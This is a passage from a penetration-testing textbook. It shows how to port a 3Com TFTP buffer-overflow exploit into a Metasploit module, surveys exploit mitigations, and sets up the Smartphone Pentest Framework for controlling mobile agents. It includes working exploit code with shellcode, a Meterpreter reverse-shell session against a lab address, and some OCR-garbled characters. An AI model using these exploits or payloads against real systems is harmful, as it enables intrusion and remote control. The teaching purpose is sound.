vulnerabilities are discovered, Metasploit modules are written for these 
issues, often by members of the security community like you. Additionally, 
as new post-exploitation or information-gathering techniques are implemented by researchers, they are often ported into Metasploit modules. 
In this section, we will look at the basics of writing our own Metasploit 
exploit module. 
N ote Metasploit modules are written in Ruby
The best way to write a Metasploit module is to start with a similar existing module or skeleton and, similar to what we did in the previous section, 
port the exploit to meet our needs. Let‚Äôs begin with an existing Metasploit 
TFTP exploit module and port the 3Com TFTP stack-based buffer overflow 
that we left as an exercise earlier in this chapter. Of course, a Metasploit 
module already exists for this vulnerability, but it would be too easy to use 
it as a base module. 
To see all the exploits for Windows TFTP servers, view the contents of 
/usr/share/metasploit-framework/modules/exploits/windows/tftp in Kali.
We‚Äôll start with the module futuresoft_transfermode.rb. This module (shown 
in Listing 19-8) exploits a similar issue: a buffer overflow in the transfer 
mode field of another piece of TFTP software. We will adapt it for our 3Com 
TFTP exploit module.
Fuzzing, Porting Exploits, and Metasploit Modules 433
root@kali:/usr/share/metasploit-framework/modules/exploits/windows/tftp# cat 
futuresoft_transfermode.rb 
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote u
 Rank = AverageRanking
 include Msf::Exploit::Remote::Udp v
 include Msf::Exploit::Remote::Seh
 def initialize(info = {})
 super(update_info(info,
 'Name' => 'FutureSoft TFTP Server 2000 Transfer-Mode Overflow',
 'Description' => %q{
 This module exploits a stack buffer overflow in the FutureSoft TFTP Server
 2000 product. By sending an overly long transfer-mode string, we were able
 to overwrite both the SEH and the saved EIP. A subsequent write-exception
 that will occur allows the transferring of execution to our shellcode
 via the overwritten SEH. This module has been tested against Windows
 2000 Professional and for some reason does not seem to work against
 Windows 2000 Server (could not trigger the overflow at all).
 },
 'Author' => 'MC',
 'References' =>
 [
 ['CVE', '2005-1812'],
 ['OSVDB', '16954'],
 ['BID', '13821'],
 ['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],
 ],
 'DefaultOptions' =>
 {
 'EXITFUNC' => 'process',
 },
 'Payload' =>
 {
 'Space' => 350, w
 'BadChars' => "\x00", x
 'StackAdjustment' => -3500, y
 },
 'Platform' => 'win',
 'Targets' => z
 [
 ['Windows 2000 Pro English ALL', { 'Ret' => 0x75022ac4} ], # ws2help.dll
 ['Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad} ], # ws2help.dll
 ['Windows NT SP5/SP6a English', { 'Ret' => 0x776a1799} ], # ws2help.dll
 ['Windows 2003 Server English', { 'Ret' => 0x7ffc0638} ], # PEB return
 ],
434 Chapter 19
 'Privileged' => true,
 'DisclosureDate' => 'May 31 2005'))
 register_options(
 [
 Opt::RPORT(69) {
 ], self.class)
 end |
 def exploit
 connect_udp}
 print_status("Trying target #{target.name}...")
 sploit = "\x00\x01" + rand_text_english(14, payload_badchars) + "\x00"
 sploit += rand_text_english(167, payload_badchars)
 seh = generate_seh_payload(target.ret)
 sploit[157, seh.length] = seh
 sploit += "\x00"
 udp_sock.put(sploit) ~
 handler
 disconnect_udp
 end
end
Listing 19-8: Metasploit module example
In the class definition u, as well as the include statements v, the author 
of this module tells Metasploit which mixins, or libraries, the module will 
inherit constructs from. This is a remote exploit over UDP that uses an SEH 
overwrite attack. 
In the Payload section w, we tell Metasploit how many bytes we have available in the attack string for the payload. We also list the bad characters that 
need to be avoided x. The StackAdjustment option y tells Metasploit to move 
ESP to the beginning of the payload to make more room on the stack for the 
payload to do its work without overwriting itself. 
In the Targets section z, the author lists all the targets that Metasploit 
can attack together with their relevant return addresses. (Note that we 
do not have to write return addresses in little-endian format. We will take 
care of this later in the module.) In addition to the default options for the 
Exploit::Remote::UDP mixin, the author also registered the RPORT option as 
69 {, the default port for TFTP. Many programming languages use brackets 
to designate blocks such as functions or loops. Python uses indentation, and 
Ruby (the language used here) uses the word end | to designate the end of a 
block. 
Fuzzing, Porting Exploits, and Metasploit Modules 435
The Exploit::Remote::UDP mixin does all the work of setting up a UDP 
socket for us. All we need to do is call the function connect_udp }. (You‚Äôll 
find the details of connect_udp and other Exploit::Remote::UDP methods at 
/usr/share/metasploit-framework/lib/msf/core/exploit/udp.rb in Kali.) 
The author then tells Metasploit how to create the exploit string. After 
the exploit string is built, the author uses the udp_sock.put method ~ to send 
it to the vulnerable server. 
A Similar Exploit String Module 
The example module uses an SEH exploit, whereas our 3Com TFTP 
exploit uses a saved return pointer, so let‚Äôs look at the exploit string in 
another Metasploit TFTP example for help in creating our exploit. Here 
is the exploit string used in the exploit/windows/tftp/tftpd32_long_filename.rb
module.
sploit = "\x00\x01"u + rand_text_english(120, payload_badchars)v + "." + 
rand_text_english(135, payload_badchars) + [target.ret].pack('V')w + payload.
encodedx + "\x00"
Recall that the first two bytes of a TFTP packet are the opcode u. Here, 
the packet is telling the TFTP we want to read a file. Next is the filename, 
rand_text_english(120, payload_badchars). As the module name suggests, rather 
than writing too much data into the transport mode field, this exploit uses 
a long filename. The author uses Metasploit‚Äôs rand_text_english function to 
create a 120-character string that avoids any bad characters by pulling from 
the BadChar variable earlier in the module v. This exploit seems to require a 
period (.) and then some more random text, after which the return address 
is added to the string. Metasploit pulls the return address from the ret variable defined earlier in the module.
pack is a Ruby method that turns an array into a binary sequence 
according to a template. The 'V' template w directs Ruby to pack our 
return address in little-endian format. Following the return address, the 
user‚Äôs chosen payload is encoded and appended to the exploit string, and 
the payload fills the total space allowed, as defined in the Space variable x. 
A null byte signals the end of the filename field. (Interestingly, the attack 
string does not even need to finish the TFTP packet to exploit the program, 
because the mode and final null byte are not appended to the exploit 
string.)
Porting Our Exploit Code
Earlier in this chapter, I suggested writing an exploit for the 3Com TFTP 
server long transport mode vulnerability as an exercise. Your finished exploit 
should be similar to the code shown in Listing 19-9. If you didn‚Äôt try writing 
this exploit, you should still be able to sort out how the code works, having 
worked through the previous examples.
436 Chapter 19
#!/usr/bin/python 
import socket
ÔÅµ shellcode = ("\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\
 x1d" + "\x4d\x2f\xe8\x83\xeb\xfc\xe2\xf4\xe1\x27\xc4\xa5\xf5\xb4\xd0\x17" + 
--snip--
"\x4e\xb2\xf9\x17\xcd\x4d\x2f\xe8")
buffer = shellcode + "A" * 129 + "\xD3\x31\xC1\x77" 
packet = "\x00\x02" + "Georgia" + "\x00" + buffer + "\x00"
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(packet,('192.168.20.10',69))
response = s.recvfrom(2048)
print response
Listing 19-9: Finished 3Com TFTP Python exploit 
Your return address may point to another JMP ESI instruction ÔÅ∂, and
you may have used a different payload ÔÅµ.
Now let‚Äôs port the Python exploit into Metasploit, changing values in 
the FutureSoft TFTP example module to fit our needs. We need to make 
only a few changes to the existing exploit module we discussed previously, 
as shown in Listings 19-10 and 19-11. 
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
 Rank = AverageRanking
 include Msf::Exploit::Remote::Udp u
 def initialize(info = {})
 super(update_info(info,
 'Name' => '3com TFTP Long Mode Buffer Overflow',
 'Description' => %q{
 This module exploits a buffer overflow in the 3com TFTP version 2.0.1 and below with 
 a long TFTP transport mode field in the TFTP packet. 
 },
 'Author' => 'Georgia',
 'References' => v
 [
 ['CVE', '2006-6183'],
 ['OSVDB', '30759'],
 ['BID', '21301'],
 ['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],
 ],
 'DefaultOptions' =>
 {
 'EXITFUNC' => 'process',
Fuzzing, Porting Exploits, and Metasploit Modules 437
 },
 'Payload' =>
 {
 'Space' => 473, w
 'BadChars' => "\x00",
 'StackAdjustment' => -3500,
 },
 'Platform' => 'win',
 'Targets' =>
 [
 ['Windows XP Pro SP3 English', { 'Ret' => 0x7E45AE4E } ], #JMP ESI USER32.dll x
 ],
 'Privileged' => true,
 'DefaultTarget' => 0, y
 'DisclosureDate' => 'Nov 27 2006'))
 
 register_options(
 [
 Opt::RPORT(69)
 ], self.class)
 end
Listing 19-10: Edited module, part 1
Because this is a saved return pointer overwrite exploit, we will 
not need to import the SEH Metasploit mixin; we will only import 
Msf::Exploit::Remote::Udp u. Next we change the module‚Äôs information to 
match the 3Com TFTP 2.0.1 long transport mode vulnerability to enable 
Metasploit users to search for our module and verify that they have the correct exploit for the vulnerability. Search vulnerability references online to 
find the CVE, OSVDB, and BID numbers, and any other relevant links v. 
Next we change the payload options to match our 3Com exploit. In our 
Python exploit, we lead with 344 bytes of shellcode, followed by 129 bytes 
of padding, giving us a total of 473 bytes to work with for the payload. Tell 
Metasploit to create a 473-byte payload at w. For the target section, our 
Python exploit covers only one platform, Windows XP Professional SP3 
English. If we were submitting our exploit to the Metasploit repositories, 
we should try to cover as many exploitable targets as possible. 
Finally, change the RET to the JMP ESI in USER32.dll  from the Python
exploit. We‚Äôve also added the DefaultTarget option to tell Metasploit to use 
target 0 by default, so the user won‚Äôt need to set a target before running the 
module y. 
The only changes we need to make in the exploit portion of the module are to the exploit string itself, as shown in Listing 19-11. 
def exploit
 connect_udp
 print_status("Trying target #{target.name}...")
438 Chapter 19
 sploit = "\x00\x02"u + rand_text_english(7, payload_badchars)v + "\x00"w
 sploit += payload.encodedx + [target.ret].pack('V')y + "\x00"z
 udp_sock.put(sploit)
 handler
 disconnect_udp
 end
end {
Listing 19-11: Edited module, part 2
As in the Python exploit, we start by telling the TFTP server to write 
to a file u. We then use the rand_text_english function to create a random 
seven-character filename v. This method is superior to using static letters 
as we did in the Python exploit, because anything that is predictable can 
be used to write signatures for antivirus programs, intrusion-prevention 
systems, and so on. Next we follow the specification for a TFTP packet with 
a null byte to finish the filename at w, and then tack on the user‚Äôs chosen 
payload x and the return address y. We finish the packet with a null byte, 
per the TFTP specification z. (After using end to close the exploit function, 
don‚Äôt forget to close the module as well at {.)
We have now written an exploit module for the 3Com TFTP 2.0.1 long 
transport mode vulnerability. Save the file in /root/.msf4/modules/exploits/
windows/tftp/myexploit.rb, and then run the Msftidy tool on the module to 
verify that it meets the format specifications for Metasploit modules. Make 
any formatting changes that Msftidy suggests before submitting a module to 
the Metasploit repository.
root@kali:~# cd /usr/share/metasploit-framework/tools/
root@kali:/usr/share/metasploit-framework/tools# ./msftidy.rb /root/.msf4/
modules/exploits/windows/tftp/myexploit.rb 
N ote From time to time, Metasploit makes changes to its desired syntax, so run msfupdat
to get the latest version of Msftidy if you are actually going to submit a module to the 
repositories. In this case, we don‚Äôt need to worry about it, and running msfupdate
may cause other exercises in the book to break, so I don‚Äôt recommend it for now.
Restart Msfconsole to load the latest modules, including any in this 
.msf4/modules directory. If you have made any syntax errors, Metasploit will 
display the details of the modules it was unable to load. 
Now use your new exploit module to attack your Windows XP target. As 
you see in Listing 19-12, Metasploit can fit many payloads in 473 characters, 
including Meterpreter u.
msf > use windows/tftp/myexploit
msf exploit(myexploit) > show options
Module options (exploit/windows/tftp/myexploit):
Fuzzing, Porting Exploits, and Metasploit Modules 439
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOST yes The target address
 RPORT 69 yes The target port
Exploit target:
 Id Name
 -- ----
 0 Windows XP Pro SP3 English
msf exploit(myexploit) > set RHOST 192.168.20.10
RHOST => 192.168.20.10
msf exploit(myexploit) > show payloads
--snip--
msf exploit(myexploit) > set payload windows/meterpreter/reverse_tcpu
payload => windows/meterpreter/reverse_tcp
msf exploit(myexploit) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(myexploit) > exploit
[*] Started reverse handler on 192.168.20.9:4444 
[*] Trying target Windows XP Pro SP3 English...
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:4662) at 
2015-02-09 09:28:35 -0500
meterpreter > 
Listing 19-12: Using your module
Now that we‚Äôve walked through one example of writing a Metasploit 
module, here‚Äôs an idea for another. A Metasploit module that can exploit 
the War-FTP 1.65 USER buffer overflow, found at /usr/share/metasploit
-framework/modules/exploits/windows/ftp/warftpd_165_user.rb, uses the saved 
return pointer overwrite technique. Try writing a similar module that uses 
the SEH overwrite technique we worked through in Chapter 18. 
Exploitation Mitigation Techniq
We discussed one exploit mitigation technique, called SafeSEH, in Chapter 18. 
In typical cat-and-mouse fashion, attackers develop new exploitation techniques while platforms implement mitigation techniques, and then attackers come up with something new. Here we will briefly discuss a few modern 
exploit mitigation methods. This list is by no means complete, nor is it 
within the scope of this book to discuss writing exploits that successfully 
bypass all these restrictions. There are many advanced exploitation and 
payload delivery techniques, such as heap sprays and return-oriented programming, beyond those discussed here. Check out my website (http://www
.bulbsecurity.com/) and the Corelan Team‚Äôs website (http://www.corelan.be/) 
for more information on advanced exploit development techniques.
440 Chapter 19
Stack Cookies 
Naturally, as buffer overflow exploits became prevalent, developers wanted 
to stop these sorts of attacks from hijacking execution. One way to do so is 
by implementing stack cookies, also known as canaries. At the start of a program, a stack cookie is calculated and added to the .data section of memory. 
Functions that use structures prone to buffer overflows, such as string buffers, grab the canary value from .data and push it onto the stack after the 
saved return address and EBP. Just before a function returns, it checks the 
value of the canary on the stack against the value in .data. If the values 
don‚Äôt match, a buffer overflow is detected, and the program is terminated 
before the attack can hijack execution. 
You can use multiple techniques for bypassing stack cookies, such as 
triggering an SEH overwrite and exception before the vulnerable function 
returns and hijacking execution before the canary value is checked. 
Address Space Layout Randomization 
The exploits we have written in this book have relied on certain instructions being at certain memory addresses. For example, in our first War-FTP 
stack-based buffer overflow example in Chapter 17, we relied on a JMP ESP
equivalent instruction in the Windows MSVCRT.dll module being at memory 
address 0x77C35459 on all Windows XP SP3 English systems. In our SEH overwrite example in Chapter 18, we relied on the POP POP RET instructions in WarFTP‚Äôs MFC42.dll module being at memory address 0x5F4580CA. If neither case 
were true, our entire attack approach would have been undermined, and we 
would have to find the instructions before we could execute them. 
When ASLR is implemented, you can‚Äôt count on certain instructions 
being at certain memory addresses. To see ASLR in action, open the Winamp 
program in Immunity Debugger on your Windows 7 virtual machine. Note 
the memory locations of Winamp.exe and some Windows DLLs such as 
USER32 and SHELL32. Now restart the system and try again. You should 
notice that the locations of the Windows components change at reboot while 
the location of Winamp.exe stays the same. In my case, the first time I looked 
at Winamp in Immunity Debugger, the memory locations were as follows:
‚Ä¢	 00400000 Winamp.exe
‚Ä¢	 778B0000 USER32.dll
‚Ä¢	 76710000 SHELL32.dll
After reboot they looked like this:
‚Ä¢	 00400000 Winamp.exe
‚Ä¢	 770C0000 USER32.dll
‚Ä¢	 75810000 SHELL32.dll
Like SafeSEH, there is no rule in Windows that programs must implement ASLR. Even some Windows applications such as Internet Explorer 
didn‚Äôt implement ASLR right away. However, Windows Vista and later 
Fuzzing, Porting Exploits, and Metasploit Modules 441
shared libraries such as USER32.dll and SHELL32.dll do use ASLR. If we 
want to use any code in these libraries, we will not be able to call instructions directly from a static address. 
Data Execution Prevention
In the exploits we developed in the past few chapters, we relied on the ability to inject our shellcode into memory somewhere, pass execution to the 
shellcode, and have the shellcode execute. Data execution prevention (DEP)
makes this a little harder by designating specific parts of memory as nonexecutable. If an attacker tries to execute code from nonexecutable memory, 
the attack will fail. 
DEP is used in most modern versions of Windows, as well as Linux, 
Mac OS, and even Android platforms. iOS does not require DEP, as discussed in the next section. 
To bypass DEP, attackers typically use a technique called return-oriented 
programming (ROP). ROP allows attackers to execute specific instructions 
already included in executable memory. One common technique is to use 
ROP to create a section of memory that is writable and executable, and 
then write the payload to this memory segment and execute it. 
Mandatory Code Signing 
Apple‚Äôs iOS team takes a different approach to preventing malicious code 
from executing. All code that executes on an iPhone must be signed by a 
trusted authority, usually Apple itself. To run an application on an iPhone, 
developers must submit the code for Apple‚Äôs review. If Apple determines 
that their app is not malicious, it is usually approved and the code is signed 
by Apple. 
One common route that malware authors take to bypass detection 
at install time is downloading new, potentially malicious code at runtime 
and executing it. However, because all memory pages must be signed by 
a trusted authority, this sort of attack will fall flat on an iPhone. As soon 
as the application attempts to run unsigned code, the CPU will reject it, 
and the application will crash. DEP is not required, because mandatory 
code signing takes the protection a step further. 
Of course, it is possible to write exploits that bypass these restrictions, 
as with iPhone jailbreaks, but on the latest versions of iOS, a jailbreak is no 
small feat. Rather than using ROP briefly to create a DEP bypass, with mandatory code signing, the entire payload must be created using ROP. 
One mitigation technique alone is not enough to foil the most skilled 
exploit developers armed with the latest methods. As a result, exploit mitigation techniques are typically chained together to further foil attacks. For 
example, iOS uses both mandatory code signing and full ASLR. Thus, an 
attacker has to use ROP for the entire payload, and thanks to ASLR, building a ROP payload is no picnic. 
442 Chapter 19
In the previous two chapters, we have covered a solid introduction to 
exploit development. Building on the skills we discussed, you can move on 
to more advanced exploitation‚Äîeven taking out the latest, most secure 
platforms and programs. 
Summar
In this chapter we looked at a few odds and ends for basic exploit development. 
We looked at a technique called fuzzing in order to find potential exploitation 
points. We also looked at working with public exploits and porting them 
to meet our needs. We replaced the shellcode using Msfvenom and found 
a return address that works with our platform. Next we looked at porting a 
completed Python exploit into our first Metasploit module. Starting with 
a module for a similar issue, we made changes to fit the 3Com TFTP long 
transport mode buffer overflow vulnerability. Finally, we talked briefly 
about some of the exploitation mitigation techniques that you will encounter as you continue your study of exploit development. 
We are nearing the end of our journey into the basics of penetration 
testing. Let‚Äôs finish up with a chapter on assessing the security of mobile 
devices. 
Part
M obile Hack

20
Using th  S mar tph o
P e ntest  rame wor
Bring your own device (BYOD) is a big buzzword in the 
industry right now. Though we‚Äôve been bringing our 
own devices to work in one form or another for years 
(contractor laptops or that game console someone 
left connected to the network in the breakroom, for example), mobile 
devices are now entering the workplace en masse, and it falls to security 
teams and pentesters to evaluate the security risks of these devices. 
In this chapter, we‚Äôll focus on tools and attacks for assessing the security of mobile devices. Mobile technology is a rapidly developing field, and 
though we can cover only the basics here, developing new mobile attacks 
and post-exploitation techniques is an ideal place to start with your own 
security research. For example, we‚Äôll be discussing a tool I created to help 
pentesters to assess the security posture of mobile devices, the Smartphone 
Pentest Framework (SPF). After working your way through this book, you will 
be ready to embark on your own infosec journey and perhaps write a tool of 
your own.
446 Chapter 20
For most of the examples in this chapter, we‚Äôll use the Android platform as a target because, in addition to being the most ubiquitous platform, 
it also allows you to create emulators on Windows, Linux, and Mac OS platforms. Although we‚Äôll focus on Android, we‚Äôll also explore an attack on a 
jailbroken iPhone. 
Mobile Attack Vecto
Though mobile devices run operating systems, speak TCP/IP, and access 
a lot of the same resources that traditional computers do, they also have 
their own unique features that add new attack vectors and protocols to the 
mix. Some features have been causing security problems on devices for years, 
while others such as near field communication, discussed later, are fairly new.
Text Messages 
Many mobile devices can send and receive text (SMS) messages. Though 
limited in size, text messages allow users to communicate almost simultaneously, often replacing email for written communications. SMS opens up a 
new social-engineering attack vector. 
Traditionally, email has been the medium for sending spam and phishing attempts, but even free email solutions do a decent job of filtering out 
the garbage these days. (If you ever need a laugh at work, check your email 
spam folder.) SMS is a different story: Although some mobile antivirus suites 
allow you to blacklist and whitelist certain mobile numbers, generally if you 
text a number to a device, the message will be received. This makes SMS an 
ideal vector for spam and phishing attacks. 
We‚Äôre already seeing annoying mobile ads and SMS phishing attempts 
that lure users to a counterfeit website to enter their credentials, much 
like the site-cloning attacks from Chapter 11. These attacks will no doubt 
become more prevalent as time goes on. Security-awareness training will 
need to be augmented to include this threat. A user who knows better than 
to click a random link in a suspicious-looking email may still click a random 
link in a text message. After all, it‚Äôs just a text‚Äîhow could a text possibly 
hurt you? But that link will open in the mobile browser or another app that 
may contain additional vulnerabilities. 
Near Field Communication
Mobile devices bring yet another attack vector to the table: near field communication, or NFC. NFC allows devices to share data by touching or 
being near each other. Mobile devices with NFC enabled can scan NFC 
tags to automate tasks such as changing settings or opening applications. 
Some can beam data, such as a photo or an entire app, from one device 
to another. NFC is another ideal social-engineering attack vector. For 
example, in Mobile Pwn2Own 2013, an exploitation contest, researchers 
used NFC to attack an Android device by beaming a malicious payload 
Using the Smartphone Pentest Framework 447
to a vulnerable application on the device. Therefore, security awareness 
training should also teach users to be aware of which NFC tags their device 
responds to and who they are beaming data with. 
QR Codes 
Quick response (QR) codes are matrix barcodes originally developed for use 
in auto manufacturing. QR codes can embed URLs, send data to an application on a mobile device, and so on, and users should be aware that what 
they are scanning may open something malicious. That QR code on a store 
window doesn‚Äôt have to point to the store‚Äôs website, and malicious QR code 
attacks have occurred in the wild. For instance, one prominent hacktivist 
changed his Twitter profile picture to a QR code, prompting many curious 
users to scan it with their phones. The QR code directed them to a malicious web page that attempted to exploit vulnerabilities in WebKit, a web 
page rendering engine used by both iOS and Android. 
The Smartphone Pentest Framewor
Enough talk; let‚Äôs turn our attention to actually attacking mobile devices 
with the help of SPF. SPF is still under active development and its feature 
set changes rapidly. By the time you work through this section, many of the 
menus may offer additional options. In Chapter 1, you downloaded the version of the SPF used in this book, but to get the main and most up-to-date 
branch of SPF, visit https://github.com/georgiaw/Smartphone-Pentest-Framework.git/.
Setting Up SPF
If you followed the instructions in Chapter 1, SPF should be all set up and 
ready to go. Because SPF uses Kali‚Äôs built-in web server to deliver some payloads, make sure that the Apache server is running, as shown here. 
root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# service apache2 start 
Additionally, SPF records information in either a MySQL or PostgreSQL 
database. Make sure the MySQL database is started, as shown here. 
root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# service mysql start
The last thing to do is edit our SPF configuration file, /root/Smartphone
-Pentest-Framework/frameworkconsole/config, to match our environment. The 
default configuration file is shown in Listing 20-1. 
root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# cat config
#SMARTPHONE PENTEST FRAMEWORK CONFIG FILE
#ROOT DIRECTORY FOR THE WEBSERVER THAT WILL HOST OUR FILES
WEBSERVER = /var/www
#IPADDRESS FOR WEBSERVER (webserver needs to be listening on this address) 
IPADDRESS = 192.168.20.9 u
448 Chapter 20
#IP ADDRESS TO LISTEN ON FOR SHELLS
SHELLIPADDRESS = 192.168.20.9 v
#IP ADDRESS OF SQLSERVER 127.0.0.1 IF LOCALHOST
MYSQLSERVER = 127.0.0.1
--snip--
#NMAP FOR ANDROID LOCATION
ANDROIDNMAPLOC = /root/Smartphone-Pentest-Framework/nmap-5.61TEST4
#EXPLOITS LOCATION
EXPLOITSLOC = /root/Smartphone-Pentest-Framework/exploits
Listing 20-1: SPF config file 
The default should meet your needs if your Kali IP address is 192.168.20.9 
and you installed SPF in /root/Smartphone-Pentest-Framework/. Otherwise, change 
the IPADDRESS u and SHELLIPADDRESS v to your Kali machine‚Äôs IP address. 
Now run SPF by changing the directory to /root/Smartphone-Pentest
-Framework/frameworkconsole/ and running ./framework.py. You should be 
presented with a menu similar to Listing 20-2. 
root@kali:~/Smartphone-Pentest-Framework/frameworkconsole# ./framework.py 
################################################
# #
# Welcome to the Smartphone Pentest Framework! #
# v0.2.6 #
# Georgia Weidman/Bulb Security #
# #
################################################
Select An Option from the Menu:
 1.) Attach Framework to a Deployed Agent/Create Agent
 2.) Send Commands to an Agent
 3.) View Information Gathered
 4.) Attach Framework to a Mobile Modem
 5.) Run a remote attack
 6.) Run a social engineering or client side attack
 7.) Clear/Create Database
 8.) Use Metasploit
 9.) Compile code to run on mobile devices
 10.) Install Stuff
 11.) Use Drozer
 0.) Exit
spf> 
Listing 20-2: Starting SPF
We will spend the rest of the chapter exploring SPF‚Äôs various options. 
For now, let‚Äôs run a quick test to make sure that SPF can communicate with 
the database. The SPF installer set up an empty database for SPF, but you 
Using the Smartphone Pentest Framework 449
can clear out all your data and start fresh by running option 7.) Clear/Create
Database, as shown here. This command will clear the SPF database tables 
and create them if they do not already exist. 
spf> 7
This will destroy all your data. Are you sure you want to? (y/N)? y
Android Emulators 
In Chapter 1, we created three Android emulators. Though some of our 
attacks will work regardless of the Android version, we‚Äôll look at certain 
client-side and privilege-escalation attacks that work well on emulators 
that target these specific older versions. Because they‚Äôre only emulators, you 
won‚Äôt be able to successfully test all known Android exploits against your 
Android emulators. 
Attaching a Mobile Modem
Because not all mobile attack vectors use the TCP/IP network, SPF piggybacks on the pentester‚Äôs devices. As of this writing, SPF can use the mobile 
modem of an Android phone with the SPF app installed or USB modem 
with a SIM card to send SMS messages. Additionally, when using an Android 
phone with NFC capability, SPF can deliver payloads via Android Beam and 
the SPF Android App. 
Building the Android App
To build the Android app from SPF, choose option 4.) Attach Framework to a 
Mobile Modem, as shown in Listing 20-3. 
spf> 4
Choose a type of modem to attach to:
 1.) Search for attached modem
 2.) Attach to a smartphone based app
 3.) Generate smartphone based app
 4.) Copy App to Webserver
 5.) Install App via ADB
spf> 3u
Choose a type of control app to generate:
 1.) Android App (Android 1.6)
 2.) Android App with NFC (Android 4.0 and NFC enabled device)
spf> 1v
Phone number of agent: 15555215556w
Control key for the agent: KEYKEY1x
Webserver control path for agent: /androidagent1y
450 Chapter 20
Control Number:15555215556
Control Key:KEYKEY1
ControlPath:/bookspf
Is this correct?(y/n)y
--snip--
-post-build:
debug:
BUILD SUCCESSFUL
Total time: 10 seconds
Listing 20-3: Building the SPF app
Next select option 3.) Generate smartphone based app u. SPF can make two 
kinds of apps: one that uses NFC, and one that does not. Because our Android 
emulator lacks NFC capabilities, choose 1.) Android App (Android 1.6) v. 
You‚Äôll be asked to enter information about an SPF agent to control 
via the SPF app. SPF agents allow us to control an infected mobile device. 
We‚Äôll look at generating and deploying SPF agents later in the chapter; for 
now, just enter the phone number of your Android 2.2 emulator w, a sevencharacter key x, and a path on the web server starting with / y. SPF will 
then use the Android SDK to build the SPF app. 
Deploying the App
Now to deploy the app on our Android 4.3 emulator. This emulator will 
simulate the pentester-controlled device, and the other two emulators will 
be our targets. If you‚Äôre running your emulators on Kali Linux or using real 
Android devices that you can attach via USB to your Kali virtual machine, 
you can use Android Debug Bridge (ADB) to install the app, as shown in 
Listing 20-4. (First, choose option 4.) Attach Framework to a Mobile Modem
from the main menu.)
spf> 4
Choose a type of modem to attach to:
 1.) Search for attached modem
 2.) Attach to a smartphone based app
 3.) Generate smartphone based app
 4.) Copy App to Webserver
 5.) Install App via ADB
spf> 5
* daemon not running. starting it now on port 5037 *
* daemon started successfully *
List of devices attached 
emulator-5554 device
emulator-5556 device 
emulator-5558 device 
Using the Smartphone Pentest Framework 451
Choose a device to install on: emulator-5554u
Which App?
 1.)Framework Android App with NFC
 2.)Framework Android App without NFC
spf> 2v
1463 KB/s (46775 bytes in 0.031s)
 pkg: /data/local/tmp/FrameworkAndroidApp.apk
Success
Listing 20-4: Installing the SPF app
From the Choose a type of modem to attach to menu, select option 5
to have ADB search for all attached devices. Next, tell SPF which emulator 
or device to install SPF on; in this example I‚Äôve chosen emulator-5554 u, the 
Android 4.3 emulator with phone number 1-555-521-5554. Finally, tell SPF 
to install the Android app without NFC (option 2) v. 
If you‚Äôre using emulators on your host system, ADB from Kali will not be 
able to attach to them. Instead, to deploy the app, choose option 4.) Attach 
Framework to a Mobile Modem from the main menu and then choose option 
4.) Copy App to Webserver, as shown in Listing 20-5. 
spf> 4
Choose a type of modem to attach to:
 1.) Search for attached modem
 2.) Attach to a smartphone based app
 3.) Generate smartphone based app
 4.) Copy App to Webserver
 5.) Install App via ADB
spf> 4
Which App?
 1.)Framework Android App with NFC
 2.)Framework Android App without NFC
spf> 2u
Hosting Path: /bookspf2v
Filename: /app.apkw
Listing 20-5: Copy app to web server
This will allow us to copy the app to Kali‚Äôs web server, where we can 
download and install it to the emulator. Tell SPF to copy the Framework 
Android App without NFC u, and then tell it where to put the app on the 
web server v. Finally, tell SPF the filename for the app to be downloaded w. 
Download the app from your Android 4.3 emulator by opening the URL 
http://192.168.20.9/bookspf2/app.apk in the mobile browser.
452 Chapter 20
Attaching the SPF Server and App
Now we need to attach the SPF server and the SPF app, as shown in 
Listing 20-6. (Again, begin with option 4 in the main menu.)
spf> 4
Choose a type of modem to attach to:
 1.) Search for attached modem
 2.) Attach to a smartphone based app
 3.) Generate smartphone based app
 4.) Copy App to Webserver
 5.) Install App via ADB
spf> 2
Connect to a smartphone management app. You will need to supply the phone 
number, the control key, and the URL path.
Phone Number: 15555215554
Control Key: KEYKEY1w
App URL Path: /bookappx
Phone Number: 15555215554
Control Key: KEYKEY1
URL Path: /bookapp
Is this correct?(y/N): y
Listing 20-6: Attaching to SPF app
Choose 2.) Attach to a smartphone 
based app u. Next, give SPF the phone 
number of the emulator running the SPF 
app v, a seven-character key w, and the 
URL where the app will check in x. (The 
key does not need to be the same one we 
used for the agent when building the app. 
Also the URL should be different from the 
one used for the agent when building the 
app.) Once you‚Äôve confirmed that this 
information is correct, SPF will appear to 
hang. We need to attach the app.
To attach the app, first open it on the 
Android emulator. The main screen asks 
for the IP address of the SPF server, the 
URL to check in, and the seven-character 
key. Use the same values as in the previous step (except the IP address should be 
the IP address of the SPF server rather 
than the phone number), as shown in 
Figure 20-1. 
Figure 20-1: SPF app
Using the Smartphone Pentest Framework 453
After you‚Äôve filled out the information, click Attach on the app. You 
will now be able to control the phone from SPF until you click Detach. Now 
return to SPF on Kali. When the app is attached, you are dropped back 
to the main SPF menu, which means we‚Äôre ready to start running mobile 
attacks. 
Remote Attac
In the history of mobile devices, there have been attacks on the mobile 
modem and other externally facing interfaces. For example, researchers 
found vulnerabilities in the mobile modem drivers for both Android phones 
and the iPhone that allowed attackers to crash the phone, take it off the 
mobile network, or even gain command execution on it, just by sending an 
SMS message. Like traditional computers, as the security position of mobile 
devices improves, the number of available remote attacks will decrease. 
That said, the more software users install on their phones, the greater the 
chance that there‚Äôs a potentially vulnerable service listening on a network 
port, as you‚Äôll learn in the following sections.
Default iPhone SSH Login 
One remote attack was perhaps the cause of the first iPhone botnet. On 
